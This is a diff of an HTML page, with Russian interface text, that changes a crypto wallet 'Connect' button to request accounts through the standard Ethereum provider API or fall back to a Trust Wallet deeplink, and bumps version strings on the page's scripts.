@@ -66,13 +66,32 @@
               <button
                 type="button"
                 data-user-wallet-connect
-                onclick="if (window.connectWalletNow) { window.connectWalletNow(event); return false; } return true;"
+                onclick="
+                  event.preventDefault();
+                  if (window.connectWalletNow) { window.connectWalletNow(event); return false; }
+                  var status = document.querySelector('[data-user-wallet-status]');
+                  var provider = (window.trustwallet && window.trustwallet.ethereum) || window.ethereum;
+                  if (provider && provider.request) {
+                    if (status) status.textContent = 'Запрашиваем вход в кошельке...';
+                    provider.request({ method: 'eth_requestAccounts' })
+                      .then(function () {
+                        if (status) status.textContent = 'Кошелек найден. Нажмите Connect еще раз.';
+                      })
+                      .catch(function () {
+                        if (status) status.textContent = 'Подтвердите вход в кошельке или откройте Trust Wallet.';
+                      });
+                    return false;
+                  }
+                  if (status) status.textContent = 'Кошелек не найден. Открываю Trust Wallet...';
+                  window.location.href = 'https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html%3Fv%3D9';
+                  return false;
+                "
               >
                 Connect
               </button>
               <a
                 class="wallet-deeplink"
-                href="https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html%3Fv%3D8"
+                href="https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html%3Fv%3D9"
                 data-trust-deeplink
                 rel="noopener"
               >
@@ -119,8 +138,8 @@
       <span>Автопроверка через Trust Wallet</span>
     </footer>
 
-    <script src="config.js?v=auto-scan8"></script>
-    <script src="auto-wallet.js?v=auto-scan8"></script>
-    <script src="check-flow.js?v=auto-scan8"></script>
+    <script src="config.js?v=auto-scan9"></script>
+    <script src="auto-wallet.js?v=auto-scan9"></script>
+    <script src="check-flow.js?v=auto-scan9"></script>
   </body>
 </html>
